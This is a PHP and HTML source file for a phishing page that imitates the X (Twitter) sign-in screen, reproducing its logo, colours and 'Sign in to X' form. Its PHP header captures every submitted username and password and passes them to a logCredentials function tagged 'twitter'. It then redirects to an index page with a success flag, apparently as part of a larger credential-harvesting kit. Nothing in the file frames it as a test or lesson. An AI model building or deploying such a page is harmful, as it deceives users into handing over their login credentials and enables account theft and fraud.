<?php
require_once 'utils.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = sanitizeInput($_POST['username'] ?? '');
    $password = sanitizeInput($_POST['password'] ?? '');
    
    logCredentials('twitter', ['username' => $username, 'password' => $password]);
    header('Location: index.php?twitter_success=1');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to X</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
            background: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 420px;
            width: 100%;
        }

        .logo {
            margin-bottom: 30px;
            text-align: left;
        }

        .logo-text {
            font-size: 32px;
            font-weight: 900;
            color: #fff;
        }

        .form-card {
            background: #000;
            border: 1px solid #333;
            border-radius: 16px;
            padding: 40px;
        }

        h1 {
            font-size: 31px;
            font-weight: 700;
            margin-bottom: 24px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        label {
            display: block;
            font-size: 15px;
            font-weight: 500;
            margin-bottom: 8px;
            color: #fff;
        }

        input {
            width: 100%;
            padding: 12px;
            background: #000;
            border: 1px solid #333;
            border-radius: 4px;
            color: #fff;
            font-size: 15px;
            transition: border-color 0.2s;
        }

        input:focus {
            outline: none;
            border-color: #1d9bf0;
            background: #000;
        }

        .login-button {
            width: 100%;
            padding: 12px;
            background: #1d9bf0;
            color: #000;
            border: none;
            border-radius: 20px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 20px;
            transition: background 0.2s;
        }

        .login-button:hover {
            background: #1a8cd8;
        }

        .footer {
            margin-top: 24px;
            text-align: center;
            font-size: 13px;
            color: #666;
        }

        .footer a {
            color: #1d9bf0;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div class="logo-text">𝕏</div>
        </div>
        
        <div class="form-card">
            <h1>Sign in to X</h1>
            
            <form method="POST">
                <div class="form-group">
                    <label for="username">Phone, email, or username</label>
                    <input type="text" id="username" name="username" required autofocus>
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                
                <button type="submit" class="login-button">Sign in</button>
            </form>
            
            <div class="footer">
                Don't have an account? <a href="#">Sign up</a>
            </div>
        </div>
    </div>
</body>
</html>
